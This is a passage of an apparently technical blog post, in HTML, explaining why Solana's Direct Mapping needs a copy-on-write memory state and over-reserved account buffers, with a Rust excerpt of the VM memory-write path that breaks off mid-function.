<h3 class="text-3xl py-4 border-b border-white/10">Copy-on-Write (CoW) Strategy</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">Now let&#x27;s start discussing why an additional copy-on-write state is required.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Avoid Authoritative Data Contamination</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Aside from plain read and write authorization, Direct Mapping introduces an even greater problem, the rollback of changes on transaction reverts. But why is this a problem? Aren&#x27;t the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedDatas</code> in <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> already a cache? This boils down to some details of <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> that we ommitted earlier.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">When <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> and <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> are first created, <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData.data</code> actually points to the authoritative account data of the persistent storage (notice <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> is an <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Arc::&lt;Vec&lt;u8&gt;&gt;</code>). Upon flushing account changes to <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> on CPI or instruction boundaries, if the data is modified, <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Arc::make_mut</code> will be called to create a copy of the data to avoid contamination of the authoritative copy. This is effectively a copy-on-write mechanism to prevent <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> from having to clone all account data. The effectiveness is however limited by the need to serialize data into VMs.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">With Direct Mapping, the serialization is removed, allowing us to fully enjoy the benifits copy-on-write brings, but it is also no longer possible to rely on calling <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Arc::make_mut</code> on CPI and instruction boundaries to protect the authoritative copy. Instead, the copy-on-write mechanism needs to be inlined into the timely memory access verfications.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">This is where the copy-on-write state comes in handy. By adding a dedicated state, Solana can differentiate between first and latter writes to account data. First writes will see a <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> of the state <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CoW</code> and consequently make a copy of the data buffer and update the state. Latter writes will then see a state of <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Writable</code>, and know that we&#x27;re already operating on a dedicated copy and no longer need to worry about contanimating authoritative data.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Buffer Reallocation Management</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Naturally, with the Direct Mapping enabled, we&#x27;d also need to address account data growth possibilities. A naive approach would be to resize the underlying <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> buffer whenever more space is required. This approach is inefficient, however, since each resize might introduce a realloc of the data buffer, and in turn, require a copy of the data. Frequent copies defeat the entire purpose of the Direct Mapping optimization.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Solana&#x27;s approach is to instead over-reserve the reallocated buffer size. On the first copy of the data (i.e. copy-on-write), the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData.data</code> reserves a buffer big enough to accommodate the max account data growth allowed by a transaction. This removes the need to constantly reallocate the buffer.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/copy_on_write.png" alt="Copy on Write"/></p>
<p class="text-xl py-3 text-pretty sm:text-justify">Summarizing the ideas, copy-on-write under Direct Mapping appears as shown in the diagram above, where <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> may have it&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">data</code> vector clones, and <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> must have its <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Host_Addr</code> updated accordingly.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">For reference, the code for writing to virtual memory now looks like this. Where memory access authorization is checked inline, and a callback function is used to update <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> and <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData.data</code> for buffers in CoW state.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">create_vm</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;b</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">...</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">EbpfVm</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">RequisiteVerifier</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">InvokeContext</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;b</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">dyn</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#e2777a">error</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> stack_size </span><span class="token token" style="color:#67cdcc">=</span><span> stack</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> heap_size </span><span class="token token" style="color:#67cdcc">=</span><span> heap</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> accounts </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f8c555">Arc</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span>invoke_context</span><span class="token token" style="color:#ccc">.</span><span>transaction_context</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">accounts</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> memory_mapping </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">create_memory_mapping</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>        regions</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>        </span><span class="token token" style="color:#999">// this is the cow_cb</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>        </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">move</span><span> </span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span class="token token closure-params">index_in_transaction</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>            </span><span class="token token" style="color:#999">// The two calls below can&#x27;t really fail. If they fail because of a bug,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>            </span><span class="token token" style="color:#999">// whatever is writing will trigger an EbpfError::AccessViolation like</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span>            </span><span class="token token" style="color:#999">// if the region was readonly, and the transaction will fail gracefully.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> account </span><span class="token token" style="color:#67cdcc">=</span><span> accounts
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">try_borrow_mut</span><span class="token token" style="color:#ccc">(</span><span>index_in_transaction </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#f8c555">IndexOfAccount</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">map_err</span><span class="token token" style="color:#ccc">(</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span class="token token closure-params">_</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span>            accounts
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">touch</span><span class="token token" style="color:#ccc">(</span><span>index_in_transaction </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#f8c555">IndexOfAccount</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span><span>                </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">map_err</span><span class="token token" style="color:#ccc">(</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span class="token token closure-params">_</span><span class="token token closure-params closure-punctuation" style="color:#ccc">|</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span><span>            </span><span class="token token" style="color:#cc99cd">if</span><span> account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_shared</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span>                </span><span class="token token" style="color:#999">// See BorrowedAccount::make_data_mut() as to why we reserve extra</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span><span>                </span><span class="token token" style="color:#999">// MAX_PERMITTED_DATA_INCREASE bytes here.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span><span>                account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">reserve</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MAX_PERMITTED_DATA_INCREASE</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">24</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">25</span><span>            </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">data_as_mut_slice</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_mut_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">26</span><span>        </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">27</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">28</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">29</span><span></span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">30</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">31</span><span></span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">ensure_writable_region</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryRegion</span><span class="token token" style="color:#ccc">,</span><span> cow_cb</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Option</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">MemoryCowCallback</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">32</span><span>    </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> cow_cb</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">33</span><span>        </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">,</span><span> _</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#f08d49">true</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">34</span><span>        </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span>cow_id</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>cb</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#f08d49">cb</span><span class="token token" style="color:#ccc">(</span><span>cow_id</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">35</span><span>            </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">36</span><span>                region</span><span class="token token" style="color:#ccc">.</span><span>host_addr</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">replace</span><span class="token token" style="color:#ccc">(</span><span>host_addr</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">37</span><span>                region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">replace</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">38</span><span>                </span><span class="token token" style="color:#f08d49">true</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">39</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">40</span><span>            </span><span class="token token" style="color:#f8c555">Err</span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">41</span><span>        </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">42</span><span>        _ </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">43</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">44</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">45</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">46</span><span></span><span class="token token" style="color:#cc99cd">impl</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f8c555">UnalignedMemoryMapping</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">47</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">48</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">store</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">T</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pod</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span> value</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">T</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span> pc</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
